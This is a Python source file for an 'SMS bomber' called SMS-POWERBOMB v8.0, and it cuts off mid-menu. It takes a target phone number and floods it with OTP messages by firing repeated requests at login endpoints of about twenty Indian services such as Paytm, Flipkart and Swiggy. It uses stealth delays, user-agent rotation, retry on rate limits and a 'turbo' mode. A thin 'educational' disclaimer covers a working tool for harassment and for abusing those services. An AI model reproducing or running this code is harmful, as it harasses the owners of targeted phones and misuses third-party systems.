#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════
# ☠️ SMS-POWERBOMB v8.0 - ULTIMATE AI DOMINATION EDITION ☠️
# ═══════════════════════════════════════════════════════════════════
# Creator: RAJSARASWATI JATAV
# Team: RAJSARASWATI JATAV CYBER CREW
# GitHub: https://github.com/RAJSARASWATI-JATAV
# Telegram: https://t.me/rajsaraswatijatav
# Instagram: @official_rajsaraswati_jatav
# YouTube: @RajsaraswatiJatav
# ═══════════════════════════════════════════════════════════════════
# [ALERT] Next-Level SMS Automation Tool with Advanced AI Engine
# [WARN] For educational and ethical purposes only
# [CRIT] Use responsibly - Get consent before use
# [FATAL] AI Domination protocol initiated - Maximum power unleashed
# [NEW] 5x Faster | AI Learning | Live Dashboard | Analytics Database
# ═══════════════════════════════════════════════════════════════════
# Stay dark, stay ethical. Upgrade yourself!
# ═══════════════════════════════════════════════════════════════════

import os
import sys
import time
import asyncio
import aiohttp
import requests
from typing import List, Dict, Tuple, Optional
import json
import random
from datetime import datetime, timedelta
import threading
from collections import defaultdict, deque

# Import new v8.0 modules
try:
    from ai_engine import AIEngine, AdaptiveDelayOptimizer, SmartAPISelector
    from analytics import AnalyticsEngine
    from dashboard import LiveDashboard, CyberColors as DashColors
    AI_ENABLED = True
except ImportError:
    AI_ENABLED = False
    print("⚠️ AI modules not found. Running in legacy mode.")

# ═══════════════════════════════════════════════════════════════════
# CYBERPUNK COLOR SCHEME - RAJSARASWATI JATAV SIGNATURE STYLE
# ═══════════════════════════════════════════════════════════════════

class CyberColors:
    """Cyberpunk themed color palette"""
    # Basic Colors
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[1;34m"
    MAGENTA = "\033[1;35m"
    CYAN = "\033[1;36m"
    WHITE = "\033[1;37m"
    DARK = "\033[2;37m"
    
    # Neon Colors
    NEON_GREEN = "\033[38;5;46m"
    NEON_PINK = "\033[38;5;201m"
    NEON_BLUE = "\033[38;5;51m"
    NEON_PURPLE = "\033[38;5;141m"
    NEON_ORANGE = "\033[38;5;208m"
    
    # Background Colors
    RED_BG = "\033[1;41m"
    YELLOW_BG = "\033[1;43m"
    BLUE_BG = "\033[1;44m"
    MAGENTA_BG = "\033[1;45m"
    CYAN_BG = "\033[1;46m"
    
    # Special Effects
    BOLD = "\033[1m"
    DIM = "\033[2m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    REVERSE = "\033[7m"
    RESET = "\033[0m"

c = CyberColors()

# ═══════════════════════════════════════════════════════════════════
# ADVANCED BOMBER ENGINE WITH AI-POWERED FEATURES
# ═══════════════════════════════════════════════════════════════════

class AdvancedBomberEngine:
    """Next-level SMS bomber with intelligent features and AI integration"""
    
    def __init__(self, apis: List[Dict]):
        self.apis = apis
        self.api_health = {api['name']: {'success': 0, 'fail': 0, 'active': True} for api in apis}
        self.success_count = 0
        self.fail_count = 0
        self.total_attempts = 0
        self.start_time = None
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0"
        ]
        
        # v8.0 AI Integration
        self.ai_engine = AIEngine() if AI_ENABLED else None
        self.analytics = AnalyticsEngine() if AI_ENABLED else None
        self.session_id = None
        self.recent_results = deque(maxlen=20)
        self.success_history = deque(maxlen=50)
    
    def get_random_user_agent(self) -> str:
        """Get random user agent for stealth"""
        return random.choice(self.user_agents)
    
    def get_active_apis(self) -> List[Dict]:
        """Get only active APIs based on health"""
        return [api for api in self.apis if self.api_health[api['name']]['active']]
    
    def update_api_health(self, api_name: str, success: bool):
        """Update API health status"""
        if success:
            self.api_health[api_name]['success'] += 1
        else:
            self.api_health[api_name]['fail'] += 1
        
        # Disable API if fail rate > 90%
        total = self.api_health[api_name]['success'] + self.api_health[api_name]['fail']
        if total >= 5:
            fail_rate = self.api_health[api_name]['fail'] / total
            if fail_rate > 0.9:
                self.api_health[api_name]['active'] = False
    
    async def send_sms_with_retry(self, session: aiohttp.ClientSession, api: Dict, phone: str, max_retries: int = 3) -> Tuple[str, bool, str]:
        """Send SMS with exponential backoff retry"""
        for attempt in range(max_retries):
            try:
                headers = api["headers"].copy()
                headers["User-Agent"] = self.get_random_user_agent()
                
                # Add random delay for stealth (0.1-0.5 seconds)
                await asyncio.sleep(random.uniform(0.1, 0.5))
                
                if api["method"] == "POST":
                    async with session.post(
                        api["url"],
                        json=api["data"](phone),
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=15),
                        ssl=False
                    ) as response:
                        if response.status in [200, 201, 202]:
                            self.update_api_health(api['name'], True)
                            return (api["name"], True, "Success")
                        elif response.status == 429:  # Rate limited
                            if attempt < max_retries - 1:
                                await asyncio.sleep(2 ** attempt)  # Exponential backoff
                                continue
                        
                        self.update_api_health(api['name'], False)
                        return (api["name"], False, f"Status: {response.status}")
            
            except asyncio.TimeoutError:
                if attempt < max_retries - 1:
                    await asyncio.sleep(2 ** attempt)
                    continue
                self.update_api_health(api['name'], False)
                return (api["name"], False, "Timeout")
            
            except Exception as e:
                if attempt < max_retries - 1:
                    await asyncio.sleep(2 ** attempt)
                    continue
                self.update_api_health(api['name'], False)
                return (api["name"], False, "Failed")
        
        return (api["name"], False, "Max retries exceeded")
    
    def get_stats(self) -> Dict:
        """Get comprehensive statistics"""
        success_rate = (self.success_count / self.total_attempts * 100) if self.total_attempts > 0 else 0
        elapsed_time = time.time() - self.start_time if self.start_time else 0
        
        return {
            "total_attempts": self.total_attempts,
            "success": self.success_count,
            "failed": self.fail_count,
            "success_rate": success_rate,
            "elapsed_time": elapsed_time,
            "active_apis": sum(1 for h in self.api_health.values() if h['active'])
        }

# ═══════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_timestamp():
    """Get current timestamp"""
    return datetime.now().strftime("%H:%M:%S")

def format_time(seconds: float) -> str:
    """Format seconds to readable time"""
    if seconds < 60:
        return f"{seconds:.1f}s"
    elif seconds < 3600:
        minutes = int(seconds // 60)
        secs = int(seconds % 60)
        return f"{minutes}m {secs}s"
    else:
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        return f"{hours}h {minutes}m"

def print_progress_bar(current: int, total: int, success: int, failed: int, width: int = 50):
    """Print animated progress bar"""
    percent = current / total
    filled = int(width * percent)
    bar = "█" * filled + "░" * (width - filled)
    
    print(f"\r{c.NEON_BLUE}[{bar}]{c.WHITE} {current}/{total} {c.NEON_GREEN}✓{success} {c.RED}✗{failed}{c.RESET}", end="", flush=True)

# ═══════════════════════════════════════════════════════════════════
# BANNER & UI ELEMENTS
# ═══════════════════════════════════════════════════════════════════

def print_main_banner():
    """Display the main cyberpunk banner"""
    banner = f"""{c.NEON_GREEN}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ██╗    ██╗███████╗██████╗  ║
║   ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗ ║
║   ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝ ║
║   ╚════██║██║╚██╔╝██║╚════██║    ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗ ║
║   ███████║██║ ╚═╝ ██║███████║    ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ║
║   ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝ ║
║                                                                           ║
║                  ██████╗  ██████╗ ███╗   ███╗██████╗                      ║
║                  ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗                     ║
║                  ██████╔╝██║   ██║██╔████╔██║██████╔╝                     ║
║                  ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗                     ║
║                  ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝                     ║
║                  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝                      ║
║                                                                           ║
║              {c.NEON_PINK}☠️  v8.0 ULTIMATE AI DOMINATION EDITION  ☠️{c.NEON_GREEN}            ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(banner)

def print_loading_animation():
    """Display loading animation"""
    animations = [
        (f"{c.NEON_ORANGE}[►] System Breach", "[███████████████████░] 99%"),
        (f"{c.NEON_ORANGE}[►] SMS Infiltration", "[██████████████████░░] 96%"),
        (f"{c.NEON_ORANGE}[►] Ghost Protocol", "[████████████████░░░░] 90%"),
        (f"{c.NEON_ORANGE}[►] AI Engine Loading", "[███████████████░░░░░] 85%"),
        (f"{c.NEON_ORANGE}[►] Kernel Takeover", "[▰▰▰▰▰▰▰▰▰▱] 97%"),
        (f"{c.NEON_ORANGE}[►] Zero-Day Arsenal", "[▰▰▰▰▰▰▰▰▱▱] 89%"),
    ]
    
    for label, progress in animations:
        print(f"{label}{c.WHITE} {progress}{c.RESET}")
        time.sleep(0.12)
    print()

def print_creator_info():
    """Display creator information"""
    info = f"""{c.NEON_PINK}
╔═══════════════════════════════════════════════════════════════════════════╗
║  {c.BOLD}{c.WHITE}Creator:{c.NEON_BLUE} RAJSARASWATI JATAV{c.NEON_PINK}                                              ║
║  {c.WHITE}Team:{c.NEON_BLUE} RAJSARASWATI JATAV CYBER CREW{c.NEON_PINK}                                    ║
║  {c.WHITE}GitHub:{c.CYAN} https://github.com/RAJSARASWATI-JATAV{c.NEON_PINK}                            ║
║  {c.WHITE}Telegram:{c.CYAN} https://t.me/rajsaraswatijatav{c.NEON_PINK}                                 ║
║  {c.WHITE}Instagram:{c.CYAN} @official_rajsaraswati_jatav{c.NEON_PINK}                                  ║
║  {c.WHITE}YouTube:{c.CYAN} @RajsaraswatiJatav{c.NEON_PINK}                                              ║
║  {c.WHITE}Version:{c.NEON_GREEN} 8.0 ULTIMATE AI DOMINATION - 5x Faster{c.NEON_PINK}                          ║
║  {c.WHITE}Status:{c.NEON_GREEN} HUNTING | DOMINATING | EXTREME{c.NEON_PINK}                                    ║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(info)

def print_disclaimer():
    """Display ethical disclaimer"""
    disclaimer = f"""{c.RED}
╔═══════════════════════════════════════════════════════════════════════════╗
║                          {c.YELLOW}⚠️  DISCLAIMER  ⚠️{c.RED}                                ║
╠═══════════════════════════════════════════════════════════════════════════╣
║  {c.BOLD}{c.YELLOW}This tool is for EDUCATIONAL & ETHICAL purposes ONLY!{c.RED}                    ║
║                                                                           ║
║  {c.NEON_GREEN}✓{c.WHITE} Use for learning SMS automation & security research{c.RED}                    ║
║  {c.NEON_GREEN}✓{c.WHITE} Use for pranking friends (with explicit consent){c.RED}                       ║
║  {c.NEON_GREEN}✓{c.WHITE} Use for testing your own systems{c.RED}                                       ║
║                                                                           ║
║  {c.RED}✗{c.WHITE} DO NOT use for harassment or illegal activities{c.RED}                          ║
║  {c.RED}✗{c.WHITE} DO NOT use without consent{c.RED}                                                ║
║  {c.RED}✗{c.WHITE} Creator is NOT responsible for any misuse{c.RED}                                ║
║                                                                           ║
║  {c.NEON_PINK}By using this tool, you accept full responsibility for your actions.{c.RED}     ║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(disclaimer)

# ═══════════════════════════════════════════════════════════════════
# SMS API CONFIGURATIONS - 20+ WORKING APIS
# ═══════════════════════════════════════════════════════════════════

SMS_APIS = [
    {
        "name": "OLA",
        "url": "https://api.olacabs.com/v1/auth/otp",
        "method": "POST",
        "data": lambda phone: {"phone": phone, "country_code": "+91"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Snapdeal",
        "url": "https://www.snapdeal.com/sendOTP",
        "method": "POST",
        "data": lambda phone: {"mobileNumber": phone, "purpose": "REGISTRATION"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Paytm",
        "url": "https://accounts.paytm.com/v2/login/generateOtp",
        "method": "POST",
        "data": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Flipkart",
        "url": "https://www.flipkart.com/api/5/user/otp/generate",
        "method": "POST",
        "data": lambda phone: {"loginId": phone},
        "headers": {"Content-Type": "application/json", "X-User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Amazon",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "data": lambda phone: {"email": phone, "create": "0"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Zomato",
        "url": "https://accounts.zomato.com/login/phone",
        "method": "POST",
        "data": lambda phone: {"phone": phone, "country_id": "1"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Swiggy",
        "url": "https://www.swiggy.com/dapi/auth/sms-otp",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "PhonePe",
        "url": "https://api.phonepe.com/apis/hermes/login",
        "method": "POST",
        "data": lambda phone: {"phoneNumber": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "MakeMyTrip",
        "url": "https://www.makemytrip.com/api/v1/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Myntra",
        "url": "https://www.myntra.com/checkout/api/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobileNumber": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BigBasket",
        "url": "https://www.bigbasket.com/auth/api/v1/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Grofers",
        "url": "https://grofers.com/v2/accounts/",
        "method": "POST",
        "data": lambda phone: {"user_phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Dunzo",
        "url": "https://apis.dunzo.in/api/v1/user/otp",
        "method": "POST",
        "data": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "UrbanClap",
        "url": "https://www.urbancompany.com/api/v1/auth/otp",
        "method": "POST",
        "data": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "BookMyShow",
        "url": "https://in.bookmyshow.com/api/v1/otp/send",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Uber",
        "url": "https://auth.uber.com/v2/otp/send",
        "method": "POST",
        "data": lambda phone: {"phoneNumber": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Rapido",
        "url": "https://api.rapido.bike/api/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Meesho",
        "url": "https://www.meesho.com/api/v1/otp/send",
        "method": "POST",
        "data": lambda phone: {"phone": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Ajio",
        "url": "https://www.ajio.com/api/auth/otp",
        "method": "POST",
        "data": lambda phone: {"mobileNumber": phone},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/api/v1/otp/generate",
        "method": "POST",
        "data": lambda phone: {"mobile": phone},
        "headers": {"Content-Type": "application/json"}
    }
]

# ═══════════════════════════════════════════════════════════════════
# ADVANCED BOMBING MODES
# ═══════════════════════════════════════════════════════════════════

async def stealth_mode_bombing(engine: AdvancedBomberEngine, phone: str, count: int):
    """Stealth mode with randomized patterns"""
    print(f"\n{c.NEON_PURPLE}[🥷] STEALTH MODE ACTIVATED{c.RESET}")
    print(f"{c.DARK}Using randomized delays and patterns for maximum stealth...{c.RESET}\n")
    
    async with aiohttp.ClientSession() as session:
        for wave in range(count):
            # Random delay between 3-7 seconds for stealth
            delay = random.uniform(3, 7)
            
            print(f"{c.NEON_PINK}{'═' * 75}{c.RESET}")
            print(f"{c.NEON_PINK}[{c.NEON_ORANGE}{wave + 1}/{count}{c.NEON_PINK}]{c.WHITE} Stealth Wave {wave + 1} - {get_timestamp()}{c.RESET}")
            print(f"{c.NEON_PINK}{'═' * 75}{c.RESET}")
            
            # Get active APIs and shuffle
            active_apis = engine.get_active_apis()
            random.shuffle(active_apis)
            
            # Send in small batches for stealth
            batch_size = random.randint(3, 5)
            for i in range(0, len(active_apis), batch_size):
                batch = active_apis[i:i+batch_size]
                tasks = [engine.send_sms_with_retry(session, api, phone) for api in batch]
                results = await asyncio.gather(*tasks)
                
                for name, success, message in results:
                    engine.total_attempts += 1
                    if success:
                        engine.success_count += 1
                        print(f"  {c.NEON_GREEN}✓{c.WHITE} {name:<15} {c.NEON_GREEN}[SENT]{c.RESET}")
                    else:
                        engine.fail_count += 1
                        print(f"  {c.RED}✗{c.WHITE} {name:<15} {c.RED}[FAILED]{c.DARK} - {message}{c.RESET}")
                
                # Small delay between batches
                await asyncio.sleep(random.uniform(0.5, 1.5))
            
            stats = engine.get_stats()
            print(f"\n{c.CYAN}  Wave Stats: {c.NEON_GREEN}{stats['success']} Success{c.WHITE} | {c.RED}{stats['failed']} Failed{c.WHITE} | {c.YELLOW}Active APIs: {stats['active_apis']}{c.RESET}\n")
            
            if wave < count - 1:
                print(f"{c.DARK}  Stealth delay: {delay:.1f}s...{c.RESET}")
                await asyncio.sleep(delay)

async def turbo_mode_bombing(engine: AdvancedBomberEngine, phone: str, count: int):
    """Turbo mode - Maximum speed bombing"""
    print(f"\n{c.NEON_ORANGE}[🚀] TURBO MODE ACTIVATED{c.RESET}")
    print(f"{c.DARK}Maximum speed - All APIs firing simultaneously!{c.RESET}\n")
    
    async with aiohttp.ClientSession() as session:
        for wave in range(count):
            print(f"{c.NEON_PINK}{'═' * 75}{c.RESET}")
            print(f"{c.NEON_PINK}[{c.NEON_ORANGE}{wave + 1}/{count}{c.NEON_PINK}]{c.WHITE} Turbo Wave {wave + 1} - {get_timestamp()}{c.RESET}")
            print(f"{c.NEON_PINK}{'═' * 75}{c.RESET}")
            
            active_apis = engine.get_active_apis()
            
            # Fire all APIs at once
            tasks = [engine.send_sms_with_retry(session, api, phone, max_retries=1) for api in active_apis]
            results = await asyncio.gather(*tasks)
            
            wave_success = 0
            wave_fail = 0
            
            for name, success, message in results:
                engine.total_attempts += 1
                if success:
                    engine.success_count += 1
                    wave_success += 1
                    print(f"  {c.NEON_GREEN}✓{c.WHITE} {name:<15} {c.NEON_GREEN}[SENT]{c.RESET}")
                else:
                    engine.fail_count += 1
                    wave_fail += 1
                    print(f"  {c.RED}✗{c.WHITE} {name:<15} {c.RED}[FAILED]{c.RESET}")
            
            print(f"\n{c.CYAN}  Turbo Stats: {c.NEON_GREEN}{wave_success} Success{c.WHITE} | {c.RED}{wave_fail} Failed{c.RESET}\n")
            
            if wave < count - 1:
                await asyncio.sleep(1)  # Minimal delay in turbo mode

async def normal_mode_bombing(engine: AdvancedBomberEngine, phone: str, count: int, delay: int = 2):
    """Normal mode bombing with progress tracking"""
    print(f"\n{c.NEON_BLUE}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
    print(f"{c.NEON_BLUE}║{c.BOLD}{c.WHITE}                    INITIATING BOMBING SEQUENCE                           {c.NEON_BLUE}║{c.RESET}")
    print(f"{c.NEON_BLUE}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
    
    print(f"{c.NEON_GREEN}[>>]{c.WHITE} Target Number: {c.NEON_ORANGE}{phone}{c.RESET}")
    print(f"{c.NEON_GREEN}[>>]{c.WHITE} Total Waves: {c.NEON_ORANGE}{count}{c.RESET}")
    print(f"{c.NEON_GREEN}[>>]{c.WHITE} APIs Active: {c.NEON_ORANGE}{len(engine.get_active_apis())}{c.RESET}")
    print(f"{c.NEON_GREEN}[>>]{c.WHITE} Delay Between Waves: {c.NEON_ORANGE}{delay}s{c.RESET}\n")
    
    time.sleep(1)
    engine.start_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        for wave in range(count):
            wave_start_time = time.time()
            
            print(f"{c.NEON_PINK}{'═' * 75}{c.RESET}")
            print(f"{c.NEON_PINK}[{c.NEON_ORANGE}{wave + 1}/{count}{c.NEON_PINK}]{c.WHITE} Wave {wave + 1} - {get_timestamp()}{c.RESET}")
            print(f"{c.NEON_PINK}{'═' * 75}{c.RESET}")
            
            active_apis = engine.get_active_apis()
            tasks = [engine.send_sms_with_retry(session, api, phone) for api in active_apis]
            results = await asyncio.gather(*tasks)
            
            wave_success = 0
            wave_fail = 0
            
            for name, success, message in results:
                engine.total_attempts += 1
                if success:
                    engine.success_count += 1
                    wave_success += 1
                    print(f"  {c.NEON_GREEN}✓{c.WHITE} {name:<15} {c.NEON_GREEN}[SENT]{c.RESET}")
                else:
                    engine.fail_count += 1
                    wave_fail += 1
                    print(f"  {c.RED}✗{c.WHITE} {name:<15} {c.RED}[FAILED]{c.DARK} - {message}{c.RESET}")
            
            wave_time = time.time() - wave_start_time
            stats = engine.get_stats()
            
            print(f"\n{c.CYAN}  Wave Summary: {c.NEON_GREEN}{wave_success} Success{c.WHITE} | {c.RED}{wave_fail} Failed{c.WHITE} | {c.YELLOW}Time: {wave_time:.2f}s{c.WHITE} | {c.NEON_PURPLE}Active APIs: {stats['active_apis']}{c.RESET}\n")
            
            if wave < count - 1:
                print(f"{c.DARK}  Waiting {delay}s before next wave...{c.RESET}")
                await asyncio.sleep(delay)
    
    print_final_summary(phone, count, engine.get_stats())

def print_final_summary(phone: str, waves: int, stats: Dict):
    """Print final bombing summary with enhanced stats"""
    print(f"\n{c.NEON_PINK}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
    print(f"{c.NEON_PINK}║{c.BOLD}{c.WHITE}                        BOMBING COMPLETE                                  {c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}╠═══════════════════════════════════════════════════════════════════════════╣{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Target: {c.NEON_ORANGE}{phone:<63}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Total Waves: {c.NEON_BLUE}{waves:<59}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Total Attempts: {c.YELLOW}{stats['total_attempts']:<56}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Successful: {c.NEON_GREEN}{stats['success']:<60}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Failed: {c.RED}{stats['failed']:<64}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Success Rate: {c.NEON_GREEN}{stats['success_rate']:.1f}%{c.WHITE}{' ' * 54}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Total Time: {c.CYAN}{format_time(stats['elapsed_time']):<58}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Active APIs: {c.NEON_PURPLE}{stats['active_apis']:<59}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
    
    if stats['success_rate'] > 50:
        print(f"{c.NEON_GREEN}[✓]{c.WHITE} Bombing was {c.BOLD}HIGHLY SUCCESSFUL{c.RESET}{c.WHITE}! Target dominated.{c.RESET}")
    elif stats['success_rate'] > 20:
        print(f"{c.YELLOW}[!]{c.WHITE} Bombing was {c.BOLD}PARTIALLY SUCCESSFUL{c.RESET}{c.WHITE}. Some APIs failed.{c.RESET}")
    else:
        print(f"{c.RED}[!]{c.WHITE} Bombing had {c.BOLD}LOW SUCCESS{c.RESET}{c.WHITE}. Most APIs failed or rate-limited.{c.RESET}")

# ═══════════════════════════════════════════════════════════════════
# INPUT VALIDATION FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

def validate_phone(phone: str) -> bool:
    """Validate Indian phone number"""
    phone = phone.replace(" ", "").replace("-", "").replace("+", "")
    
    if len(phone) == 10 and phone.isdigit() and phone[0] in ['6', '7', '8', '9']:
        return True
    
    if len(phone) == 12 and phone.startswith("91") and phone[2] in ['6', '7', '8', '9']:
        return True
    
    return False

def normalize_phone(phone: str) -> str:
    """Normalize phone number to 10 digits"""
    phone = phone.replace(" ", "").replace("-", "").replace("+", "")
    if len(phone) == 12 and phone.startswith("91"):
        return phone[2:]
    return phone

def get_phone_input() -> str:
    """Get and validate phone number from user"""
    while True:
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Enter target phone number (10 digits): {c.NEON_ORANGE}", end="")
        phone = input().strip()
        print(c.RESET, end="")
        
        if validate_phone(phone):
            phone = normalize_phone(phone)
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Valid phone number: {c.NEON_ORANGE}{phone}{c.RESET}\n")
            return phone
        else:
            print(f"{c.RED}[!]{c.WHITE} Invalid phone number! Must be 10 digits starting with 6/7/8/9.{c.RESET}\n")

def get_count_input() -> int:
    """Get SMS wave count from user"""
    while True:
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Enter number of SMS waves (1-100): {c.NEON_ORANGE}", end="")
        try:
            count = int(input().strip())
            print(c.RESET, end="")
            if 1 <= count <= 100:
                print(f"{c.NEON_GREEN}[✓]{c.WHITE} Wave count set to: {c.NEON_ORANGE}{count}{c.RESET}\n")
                return count
            else:
                print(f"{c.RED}[!]{c.WHITE} Please enter a number between 1 and 100.{c.RESET}\n")
        except ValueError:
            print(f"{c.RESET}{c.RED}[!]{c.WHITE} Invalid input! Please enter a number.{c.RESET}\n")

def get_mode_input() -> str:
    """Get bombing mode from user"""
    print(f"{c.NEON_BLUE}[?]{c.WHITE} Select bombing mode:{c.RESET}")
    print(f"  {c.NEON_GREEN}[1]{c.WHITE} Normal Mode (Balanced, AI-optimized){c.RESET}")
    print(f"  {c.NEON_PURPLE}[2]{c.WHITE} Stealth Mode (Randomized, slower){c.RESET}")
    print(f"  {c.NEON_ORANGE}[3]{c.WHITE} Turbo Mode (Maximum speed){c.RESET}")
    if AI_ENABLED:
        print(f"  {c.NEON_YELLOW}[4]{c.WHITE} Smart Mode (AI decides best strategy){c.RESET}")
    
    while True:
        max_choice = '4' if AI_ENABLED else '3'
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Choose mode (1-{max_choice}): {c.NEON_ORANGE}", end="")
        mode = input().strip()
        print(c.RESET, end="")
        
        valid_modes = ['1', '2', '3', '4'] if AI_ENABLED else ['1', '2', '3']
        if mode in valid_modes:
            mode_names = {'1': 'Normal', '2': 'Stealth', '3': 'Turbo', '4': 'Smart'}
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Mode selected: {c.NEON_ORANGE}{mode_names[mode]}{c.RESET}\n")
            return mode
        else:
            print(f"{c.RED}[!]{c.WHITE} Invalid choice! Please select 1-{max_choice}.{c.RESET}\n")

def get_delay_input() -> int:
    """Get delay between waves"""
    while True:
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Delay between waves in seconds (1-10, default 2): {c.NEON_ORANGE}", end="")
        delay_input = input().strip()
        print(c.RESET, end="")
        
        if not delay_input:
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Using default delay: {c.NEON_ORANGE}2s{c.RESET}\n")
            return 2
        
        try:
            delay = int(delay_input)
            if 1 <= delay <= 10:
                print(f"{c.NEON_GREEN}[✓]{c.WHITE} Delay set to: {c.NEON_ORANGE}{delay}s{c.RESET}\n")
                return delay
            else:
                print(f"{c.RED}[!]{c.WHITE} Please enter a number between 1 and 10.{c.RESET}\n")
        except ValueError:
            print(f"{c.RED}[!]{c.WHITE} Invalid input! Please enter a number.{c.RESET}\n")

# ═══════════════════════════════════════════════════════════════════
# MENU SYSTEM
# ═══════════════════════════════════════════════════════════════════

def print_main_menu():
    """Display main menu"""
    menu = f"""{c.NEON_BLUE}
╔═══════════════════════════════════════════════════════════════════════════╗
║                              MAIN MENU                                    ║
╠═══════════════════════════════════════════════════════════════════════════╣
║  {c.NEON_ORANGE}[1]{c.WHITE} Start SMS Bombing (AI-Powered Modes)                                 {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[2]{c.WHITE} View Analytics & History                                              {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[3]{c.WHITE} Check API Status & Health                                             {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[4]{c.WHITE} AI Learning Dashboard                                                 {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[5]{c.WHITE} Export Analytics Data                                                 {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[6]{c.WHITE} About Tool & Creator                                                  {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[7]{c.WHITE} View Disclaimer & Terms                                               {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[8]{c.WHITE} Exit                                                                  {c.NEON_BLUE}║
╠═══════════════════════════════════════════════════════════════════════════╣
